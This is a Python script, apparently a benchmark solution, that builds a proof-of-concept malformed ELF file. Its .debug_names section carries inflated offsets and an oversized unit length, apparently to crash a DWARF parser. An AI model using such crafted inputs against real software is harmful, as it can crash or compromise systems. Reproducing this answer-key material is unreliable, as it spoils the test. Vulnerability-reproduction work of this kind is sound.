import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        shstrtab = b'.shstrtab\x00.debug_names\x00'
        shstrtab_size = len(shstrtab)
        large_offset = 0x10000
        bucket_count = 1
        name_count = 1
        header_size = 58
        entry_pool_rel = header_size
        bucket_size = bucket_count * 8
        unit_length = 1268
        debug_names = struct.pack('<I', unit_length)
        debug_names += struct.pack('<H', 5)
        debug_names += struct.pack('<H', 0)
        debug_names += struct.pack('<B', 1)
        debug_names += struct.pack('<B', 8)
        debug_names += struct.pack('<I', 0)
        debug_names += struct.pack('<I', large_offset)
        debug_names += struct.pack('<I', 0)
        debug_names += struct.pack('<I', large_offset)
        debug_names += struct.pack('<I', 0)
        debug_names += struct.pack('<I', large_offset)
        debug_names += struct.pack('<I', 0)
        debug_names += struct.pack('<I', bucket_count)
        debug_names += struct.pack('<I', name_count)
        debug_names += struct.pack('<I', header_size)
        debug_names += struct.pack('<I', entry_pool_rel)
        debug_names += struct.pack('<I', 0)
        for _ in range(bucket_count):
            debug_names += struct.pack('<I', 0)
            debug_names += struct.pack('<I', 0)
        remaining = unit_length - header_size - bucket_size
        debug_names += b'A' * remaining
        debug_names_size = len(debug_names)
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 1)
        e_machine = struct.pack('<H', 62)
        e_version = struct.pack('<I', 1)
        e_entry = struct.pack('<Q', 0)
        e_phoff = struct.pack('<Q', 0)
        elf_size = 64
        shstrtab_offset = elf_size
        debug_offset = shstrtab_offset + shstrtab_size
        shoff = debug_offset + debug_names_size
        e_shoff = struct.pack('<Q', shoff)
        e_phentsize = struct.pack('<H', 0)
        e_phnum = struct.pack('<H', 0)
        e_shentsize = struct.pack('<H', 64)
        e_shnum = struct.pack('<H', 3)
        e_shstrndx = struct.pack('<H', 1)
        e_flags = struct.pack('<I', 0)
        e_ehsize = struct.pack('<H', 64)
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
        null_sh = struct.pack('<I', 0)
        null_sh += struct.pack('<I', 0)
        null_sh += struct.pack('<Q', 0)
        null_sh += struct.pack('<Q', 0)
        null_sh += struct.pack('<Q', 0)
        null_sh += struct.pack('<Q', 0)
        null_sh += struct.pack('<I', 0)
        null_sh += struct.pack('<I', 0)
        null_sh += struct.pack('<Q', 0)
        null_sh += struct.pack('<Q', 0)
        shstrtab_sh = struct.pack('<I', 0)
        shstrtab_sh += struct.pack('<I', 3)
        shstrtab_sh += struct.pack('<Q', 0)
        shstrtab_sh += struct.pack('<Q', 0)
        shstrtab_sh += struct.pack('<Q', shstrtab_offset)
        shstrtab_sh += struct.pack('<Q', shstrtab_size)
        shstrtab_sh += struct.pack('<I', 0)
        shstrtab_sh += struct.pack('<I', 0)
        shstrtab_sh += struct.pack('<Q', 1)
        shstrtab_sh += struct.pack('<Q', 0)
        debug_name_off = 10
        debug_sh = struct.pack('<I', debug_name_off)
        debug_sh += struct.pack('<I', 1)
        debug_sh += struct.pack('<Q', 0)
        debug_sh += struct.pack('<Q', 0)
        debug_sh += struct.pack('<Q', debug_offset)
        debug_sh += struct.pack('<Q', debug_names_size)
        debug_sh += struct.pack('<I', 0)
        debug_sh += struct.pack('<I', 0)
        debug_sh += struct.pack('<Q', 1)
        debug_sh += struct.pack('<Q', 0)
        all_sh = null_sh + shstrtab_sh + debug_sh
        poc = elf_header + shstrtab + debug_names + all_sh
        return poc